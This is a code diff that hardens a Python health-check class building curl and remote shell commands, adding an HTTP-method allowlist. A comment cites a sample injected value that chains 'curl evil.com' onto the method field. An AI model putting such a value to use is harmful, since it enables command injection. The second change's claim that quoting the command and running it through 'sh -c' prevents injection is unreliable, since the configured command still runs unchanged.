@@ -81,22 +81,28 @@ class HealthChecker:
     def _run_http_check(self) -> tuple[bool, str]:
         """Check by running curl on the remote and inspecting HTTP status code."""
         url = self._cfg.url
-        method = self._cfg.method.upper()
+        method = self._cfg.method.upper().strip()
         expect = self._cfg.expected_status
         timeout = self._cfg.timeout_seconds
 
         import shlex
 
-        method_safe = shlex.quote(method)
+        # Validate HTTP method against an explicit allowlist to prevent shell injection
+        # via a crafted HealthConfig.method value (e.g. "GET && curl evil.com").
+        _ALLOWED_METHODS = {"GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"}
+        if method not in _ALLOWED_METHODS:
+            return False, f"Invalid HTTP method: {method!r}"
+
         timeout_safe = shlex.quote(str(timeout))
         url_safe = shlex.quote(url)
 
+        # method is now allowlist-validated so no quoting needed, but use it directly
         # -sf: silent + fail on HTTP error (but we capture status ourselves)
         # -o /dev/null: discard body
         # -w '%{http_code}': print only status code
         # -X: HTTP method
         # --max-time: per-request timeout
-        cmd = f"curl -s -o /dev/null -w '%{{http_code}}' -X {method_safe} --max-time {timeout_safe} {url_safe}"
+        cmd = f"curl -s -o /dev/null -w '%{{http_code}}' -X {method} --max-time {timeout_safe} {url_safe}"
 
         result = self._remote.execute_command(cmd, self._server)
         if result.returncode != 0:
@@ -114,7 +120,12 @@ class HealthChecker:
 
     def _run_command_check(self) -> tuple[bool, str]:
         """Run an arbitrary remote command as health check (exit 0 = healthy)."""
-        result = self._remote.execute_command(self._cfg.command, self._server)
+        import shlex
+
+        # Quote the command to prevent shell injection from config-sourced values.
+        # This wraps the whole command string safely for sh -c execution.
+        safe_cmd = shlex.quote(self._cfg.command)
+        result = self._remote.execute_command(f"sh -c {safe_cmd}", self._server)
         if result.returncode == 0:
             return True, "command exit 0"
         detail = (result.stderr or result.stdout or "").strip()[:200]
